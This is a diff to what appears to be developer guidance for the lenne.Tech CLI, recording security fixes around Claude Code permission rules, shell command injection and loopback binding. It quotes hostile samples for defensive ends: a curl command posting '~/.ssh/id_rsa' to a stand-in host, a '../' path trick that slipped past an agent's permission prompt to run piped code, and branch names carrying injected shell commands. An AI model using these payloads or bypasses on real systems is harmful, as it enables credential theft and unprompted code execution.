@@ -248,7 +248,7 @@ ports. Developers and Claude Code never see the internal ports.
 | Identity (slug + subdomains) | `src/lib/dev-identity.ts` | `projectSlug` reads `package.json` "name" (scope stripped, slugified); `buildIdentity` enumerates `projects/api`/`projects/app` (monorepo) or detects `config.env.ts`/`nuxt.config.ts` (standalone). |
 | ENV builder | `src/lib/dev-env.ts` | Single source of truth for `BASE_URL`, `APP_URL`, `NUXT_API_URL`, `NUXT_PUBLIC_*`, `NUXT_SESSION_PASSWORD`, `NSC__MONGOOSE__URI`, `DATABASE_URL`. **Always URLs, never bare ports.** `NUXT_PUBLIC_API_PROXY=false` because Caddy + cookie-domain make vite-proxy obsolete. `NUXT_SESSION_PASSWORD` resolves shell export → the app's own `.env` (via the optional `appDir` input) → a fallback derived as `HMAC-SHA256(machine salt, 'lt-dev:session:<slug>')`, 32 hex chars; the salt lives at `~/.lenneTech/dev-session-salt` (0600, override `LT_DEV_SESSION_SALT_PATH`). |
 | Registry + session state | `src/lib/dev-state.ts` | Central registry `~/.lenneTech/projects.json` (override via `LT_DEV_REGISTRY_PATH`); per-project session at `<root>/.lt-dev/state.json`. Atomic writes; PID validation gate via `isValidPid` / `isPidAlive`. |
-| Caddy integration | `src/lib/caddy.ts` | One block per project, marked with `# >>> lt-dev:<slug> >>>`/`# <<<`. `upsertProjectBlock` is idempotent; `removeProjectBlock` is a no-op when absent. Caddyfile path overridable via `LT_DEV_CADDYFILE`. The daemon is owned by `lt dev install` (see `dev-service.ts`) — **never** rely on `brew services caddy`: its plist hardcodes `--config /opt/homebrew/etc/Caddyfile` and crash-loops against our location, which is the bug that originally blocked the first real `lt dev install`. |
+| Caddy integration | `src/lib/caddy.ts` | One block per project, marked with `# >>> lt-dev:<slug> >>>`/`# <<<`. `upsertProjectBlock` is idempotent; `removeProjectBlock` is a no-op when absent. Caddyfile path overridable via `LT_DEV_CADDYFILE`. Every write goes through `ensureLoopbackBind`: a global `{ default_bind 127.0.0.1 [::1] }` block before the first project marker, so stacks are not reachable from the LAN (the `lt dev test` seed admin's password is in this public repo); a user-set `default_bind` is kept. The daemon is owned by `lt dev install` (see `dev-service.ts`) — **never** rely on `brew services caddy`: its plist hardcodes `--config /opt/homebrew/etc/Caddyfile` and crash-loops against our location, which is the bug that originally blocked the first real `lt dev install`. |
 | VS Code memory profile | `src/commands/dev/vscode.ts` + `src/lib/vscode-settings.ts` | `lt dev vscode` (alias `vsc`) tunes the USER `settings.json` of VS Code / Insiders / Cursor / VSCodium. Machine-level, not project-level — no registry or Caddy involvement. JSONC-aware via `jsonc-parser` (lazy-required, since gluegun loads every command on every `lt` run) so comments survive; refuses an unparseable file or a symlink; keeps the FIRST `settings.json.bak`. Object-valued exclude maps are MERGED on apply (user entries win) and SUBTRACTED on `--revert`, so an undo never removes a hand-maintained exclusion. `MEMORY_PROFILE` targets the per-root SEMANTIC TS servers and excludes `**/.nuxt*/**` / `**/.output*/**` (segment globs — the bare names miss `.nuxt-test`); `EXCLUDED_FROM_PROFILE` records three commonly recommended keys that were ruled out, surfaced by `--explain`. `--dry-run` uses presence-as-intent (`isPreventingFlagSet`), not `=== true`, because it PREVENTS a write; `--noConfirm` must be an explicit CLI flag — a repo-local `lt.config.json` must not silence a prompt guarding a machine-global write. |
 | Caddy service lifecycle | `src/lib/dev-service.ts` + `src/commands/dev/{install,uninstall}.ts` | Per-OS service runner. macOS: per-user LaunchAgent `~/Library/LaunchAgents/tech.lenne.lt-dev-caddy.plist` via `launchctl bootstrap gui/<uid>`. Linux: `~/.config/systemd/user/lt-dev-caddy.service` via `systemctl --user enable --now`. Render helpers (`renderLaunchAgentPlist`, `renderSystemdUnit`) are pure + unit-tested; side-effecting ops accept an injectable `ShellRunner`. **Critical:** plist sets `HOME=$userHome` env so caddy persists its CA under `~/Library/Application Support/Caddy/`, not the launchd-empty default. `userHome()` is `process.env.HOME || homedir()` because real `os.homedir()` on macOS goes through `getpwuid()` and ignores HOME — required so test files can redirect side-effects to a tmpdir. The `caddy trust` instructions surfaced to users **must** include `-E HOME="$HOME"` for the same reason in sudo context. |
 | install↔init auto-chaining | `src/lib/dev-bootstrap.ts` (predicates) + `src/lib/dev-install-helper.ts` (`runInstall`) + `src/lib/dev-migrate-helper.ts` (`runMigrate`/`printMigrateResult`) + `src/commands/dev/{install,init}.ts` | `lt dev init` runs install first when `!isMachinePrepared()`; `lt dev install` runs init after when `isLtDevProject() && !isProjectInitialized()`. Non-recursive by construction: commands call the *helpers*, never each other. Opt-outs: `--skip-install` (init), `--skip-init` (install). `runInstall` must NOT call `process.exit`. |
@@ -1425,6 +1425,87 @@ device, no exit code to misread — and one probe for all three call sites
 of which had the identical bug. `2>/dev/null` inside `system.run` shell strings is a
 separate, still-open instance of the same family (see
 `windows-support/cli-posix-commands.md`).
+
+### `lt claude plugins` writes GLOBAL permission rules, so it has to take them back too <!-- Added: 2026-10-18 -->
+`setupPermissions` (`plugin-utils.ts`) copies each plugin's `permissions.json` into the
+user-wide `settings.json`. Until 1.50.6 it only appended. When the marketplace narrowed
+its rules (`Bash(curl:*)`, `Bash(rm:*)`, `Bash(curl *localhost*)`, which also matches
+`curl -d @~/.ssh/id_rsa https://x/?localhost`), every existing install kept the broad
+ones, and in auto mode an allow rule applies before the classifier. Worse, any run of
+an older CLI against a marketplace that still lists them puts them back: a manual
+cleanup on 2026-10-18 was undone seven minutes later by exactly that.
+
+**Rules** (all in `src/lib/plugin-permissions.ts`, decision in the pure `planPermissionSync`):
+- Remove only what lt wrote. The ledger `~/.lenneTech/claude-plugin-permissions.json`
+  records rules per settings file and plugin. A rule nobody recorded is the user's.
+- Rules from before the ledger are named by each plugin in `formerPatterns` (top-level
+  string list in its `permissions.json`), read from the marketplace clone. **Never put
+  such a list in this repo:** it is public, and an internal plugin's former rules name
+  internal hosts and addresses. The first draft hard-coded one and had to be reverted.
+- Apply each former rule ONCE, tracked in the ledger (`formerApplied`), and not only on
+  a plugin's first run: a CLI that meets the plugin before the marketplace ships the
+  field would otherwise close the window for good. Once applied, a rule the user adds
+  back by hand stays.
+- Never remove a rule the plugin still lists or another plugin's ledger entry holds.
+  Together with the once-per-rule tracking, that makes the order of CLI and marketplace
+  releases irrelevant.
+- Run the sync for every plugin, also one that ships no rules (any more). The old call
+  site skipped empty lists, so lt-offers' former rules could never have gone.
+- **Never write a rule with `${CLAUDE_PLUGIN_ROOT}`, in any form.** Claude Code does not
+  expand the variable, so the verbatim rule is dead. A pre-release build resolved it to
+  `<config dir>/plugins/cache/<marketplace>/<plugin>/*` and that was arbitrary code
+  execution: Claude Code compiles `*` to `.*` and never normalises paths, so
+  `bash <cache>/lt-dev/1.0.0/scripts/../../../../dev/stdin` matched
+  `…/lt-dev/*/scripts/*` and ran piped code without a prompt (measured 2026-10-18 for
+  bash and node). The code comment had called the `../` widening "accepted": it had only
+  considered reaching sibling folders, not every file on disk. Both forms are now
+  `withdrawnRules`, removed on every run. Pinning the version is not enough while a
+  plugin ships a trailing `scripts/*`; only exact script paths could be allowed safely.
+- `CLAUDE_CONFIG_DIR` (`claude-cli.ts#getClaudeConfigDir`) counts for settings, cache and
+  marketplace clones alike.
+
+### Never interpolate a value into `system.run` — use `execArgs` <!-- Added: 2026-10-19 -->
+gluegun's `system.run` hands its string to `child_process.exec`, i.e. `/bin/sh` or `cmd.exe`.
+Branch names, remote URLs, project paths and commit messages used to be interpolated into it,
+from CLI flags (an AI agent under a global `lt …` permission rule supplies those) and from
+`lt.config.*` files, which are read from every parent directory, so a cloned repository can
+supply them. Git allows `;`, `|`, `$` and backticks in ref names, so even a name read back
+from git output is not safe: a remote branch `feature/x;touch${IFS}PWNED` ran `touch` on
+`lt git get feature/x`. An audit found ~25 such sites across `lt git *`, `fullstack init`,
+the framework clones, `directus typegen` and `server permissions` (`exec("open \"…\"")`); the
+first conversion pass missed four more (`rebase`/`reset` chains, `getFirstBranchCommit`,
+`cli create`'s rename) because they were multi-line or `+`-concatenated, so a single-line grep for
+`` run(`…${ `` does not find every site. `safeRef` does NOT make a value shell-safe (git accepts
+`x;echo${IFS}PWNED>m;#` as a branch name); only the argument list does.
+**Rules:**
+- Run programs with `execArgs(cmd, args, { cwd })` (`src/lib/exec-args.ts`, `execFile`, no
+  shell). Keep `system.run` only for a CONSTANT command string, and pass a directory as
+  `{ cwd }`, never as `cd ${dir} &&`. Use `--` before positional URLs/paths where git accepts it.
+- A program that may be an npm `.cmd` shim on Windows (npm/pnpm/npx, `bun`, global CLIs) cannot
+  be `execFile`d: use `spawnArgs` (cross-spawn, async). The shim re-parses its arguments through
+  cmd.exe, so values from flags/config go through `hasCmdShimHazard` first (`"`, `%`, line
+  breaks). Never `spawnCmdSync` under a running spinner: it blocks Ctrl+C until the child exits.
+- A ref passed as a positional git argument goes through `safeRef` (no leading `-`, no
+  whitespace). It TRIMS: values from git output end in `\n`, which the old shell strings
+  silently treated as end of command. The first draft did not trim, and `lt git get` broke on
+  `git.getDefaultBranch()`; the fixture test in `git-commands.test.ts` caught it. It also
+  STRINGIFIES: gluegun parses a digits-only positional as a number (`lt git create 2314 main`),
+  and template strings had hidden that. Test validators with values from `parseParams`.
+- A name used as one path segment (`--element`) goes through `isSafePathSegment`, an output
+  path through `isPathInside` (`src/lib/safe-paths.ts`).
+- Still shell strings, by design: the scaffolders' `cd ${projectDir} && git init …` (projectDir is
+  `kebabCase(name)`, so `[a-z0-9-]` only) and constant package-manager commands.
+- Remaining known gap: `npm/reinit.ts` still runs `ncu -u --packageFile ${path}` through a shell
+  (a global `.cmd` shim on Windows cannot be `execFile`d); the path comes from a filesystem lookup.
+
+### A command that changes a project refuses flags it does not know <!-- Added: 2026-10-19 -->
+gluegun/yargs-parser accepts any flag and the command never sees the typo. Plugin docs told
+agents to run `lt fullstack convert-mode --skip-app`; the real flag is `--skip-frontend`, so
+with `--noConfirm` the frontend was converted anyway. The three `convert-mode` commands now
+build their allow-list from their own `help.options` (`findUnknownOptions`,
+`src/lib/unknown-options.ts`, which also handles yargs' duplicate camelCase key) and exit 1
+before touching anything. `__tests__/unknown-options.test.ts` checks that every flag a command
+reads is declared in its `help`, or the command would refuse its own flag.
 
 ### Running lt CLI Commands (AI Agent Usage)
 When executing `lt` commands, prefer explicit parameters over interactive prompts where possible. The CLI will show a hint in non-interactive mode, but you can avoid it by providing the required flags:
